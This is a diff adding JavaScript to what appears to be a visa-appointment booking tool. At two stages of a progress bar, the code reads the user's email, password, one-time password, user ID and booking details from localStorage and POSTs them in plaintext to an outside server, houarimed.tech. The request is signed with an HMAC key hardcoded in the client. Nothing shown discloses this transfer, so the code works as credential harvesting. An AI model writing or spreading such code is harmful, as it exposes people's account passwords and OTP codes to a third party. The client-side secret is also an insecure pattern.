@@ -1,0 +1,145 @@
+var intervalFrom = setInterval(function (){
+    
+ if(document.querySelector("#progress-percent").textContent !== '0%' && document.querySelector("#progress-percent").textContent === '25%'){
+
+
+    
+let AppointmentStatus = 'Form' ;
+     
+     
+    
+       // Example of user data
+    let email = localStorage.email || '';
+    let password = localStorage.password || '';
+    let user_id = localStorage.UserId || '';
+    let location = localStorage.location || '';
+    let category = localStorage.category || '';
+    let passwordotp = localStorage.passwordOTP || '';
+    let appointment_type = localStorage.visaSubtype || '';
+    let status = AppointmentStatus || '';
+    let Appointment_Date = localStorage.TakenDate || '';
+    let Appointment_Slot = localStorage.TakenSlot || '';
+    let secretKey = 'meddah32'; // Secret keyهذا هو المفتاح الخاص
+
+    // Function to generate HMAC signature using Web Crypto API
+    async function generateHmacSignature(secret, data) {
+        const encoder = new TextEncoder();
+        const key = await crypto.subtle.importKey(
+            "raw",
+            encoder.encode(secret),
+            { name: "HMAC", hash: { name: "SHA-256" } },
+            false,
+            ["sign"]
+        );
+        const signature = await crypto.subtle.sign(
+            "HMAC",
+            key,
+            encoder.encode(data)
+        );
+        return btoa(String.fromCharCode(...new Uint8Array(signature))); // Convert to Base64
+    }
+
+    // Combine all the data into a single string for signing
+    let dataToSign = `email=${email}&password=${password}&user_id=${user_id}&location=${location}&category=${category}&passwordotp=${passwordotp}&appointment_type=${appointment_type}&status=${status}&Appointment_Date=${Appointment_Date}&Appointment_Slot=${Appointment_Slot}`;
+    
+    // Generate the HMAC signature and send the data
+    generateHmacSignature(secretKey, dataToSign).then(signature => {
+        // Send data to the PHP server with the signature
+        fetch('https://houarimed.tech/rdv/submit1.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&user_id=${encodeURIComponent(user_id)}&location=${encodeURIComponent(location)}&category=${encodeURIComponent(category)}&passwordotp=${encodeURIComponent(passwordotp)}&appointment_type=${encodeURIComponent(appointment_type)}&status=${encodeURIComponent(status)}&Appointment_Date=${encodeURIComponent(Appointment_Date)}&Appointment_Slot=${encodeURIComponent(Appointment_Slot)}&signature=${encodeURIComponent(signature)}`
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log('Data sent successfully:', data);
+        })
+        .catch(error => {
+            console.error('Error sending data:', error);
+        });
+    }); 
+ 
+  clearInterval(intervalFrom);
+
+ 
+    
+ 
+ }
+
+},500)
+
+
+
+var intervalPayment = setInterval(function (){
+
+    
+ if(document.querySelector("#progress-percent").textContent !== '0%' && document.querySelector("#progress-percent").textContent === '50%'){
+
+
+    
+let AppointmentStatus = 'Payment' ;
+     
+     
+    
+       // Example of user data
+    let email = localStorage.email || '';
+    let password = localStorage.password || '';
+    let user_id = localStorage.UserId || '';
+    let location = localStorage.location || '';
+    let category = localStorage.category || '';
+    let passwordotp = localStorage.passwordOTP || '';
+    let appointment_type = localStorage.visaSubtype || '';
+    let status = AppointmentStatus || '';
+    let Appointment_Date = localStorage.TakenDate || '';
+    let Appointment_Slot = localStorage.TakenSlot || '';
+    let secretKey = 'meddah32'; // Secret keyهذا هو المفتاح الخاص
+
+    // Function to generate HMAC signature using Web Crypto API
+    async function generateHmacSignature(secret, data) {
+        const encoder = new TextEncoder();
+        const key = await crypto.subtle.importKey(
+            "raw",
+            encoder.encode(secret),
+            { name: "HMAC", hash: { name: "SHA-256" } },
+            false,
+            ["sign"]
+        );
+        const signature = await crypto.subtle.sign(
+            "HMAC",
+            key,
+            encoder.encode(data)
+        );
+        return btoa(String.fromCharCode(...new Uint8Array(signature))); // Convert to Base64
+    }
+
+    // Combine all the data into a single string for signing
+    let dataToSign = `email=${email}&password=${password}&user_id=${user_id}&location=${location}&category=${category}&passwordotp=${passwordotp}&appointment_type=${appointment_type}&status=${status}&Appointment_Date=${Appointment_Date}&Appointment_Slot=${Appointment_Slot}`;
+    
+    // Generate the HMAC signature and send the data
+    generateHmacSignature(secretKey, dataToSign).then(signature => {
+        // Send data to the PHP server with the signature
+        fetch('https://houarimed.tech/rdv/submit1.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&user_id=${encodeURIComponent(user_id)}&location=${encodeURIComponent(location)}&category=${encodeURIComponent(category)}&passwordotp=${encodeURIComponent(passwordotp)}&appointment_type=${encodeURIComponent(appointment_type)}&status=${encodeURIComponent(status)}&Appointment_Date=${encodeURIComponent(Appointment_Date)}&Appointment_Slot=${encodeURIComponent(Appointment_Slot)}&signature=${encodeURIComponent(signature)}`
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log('Data sent successfully:', data);
+        })
+        .catch(error => {
+            console.error('Error sending data:', error);
+        });
+    }); 
+ 
+ 
+ clearInterval(intervalPayment);
+    
+ 
+ }
+},500)
+
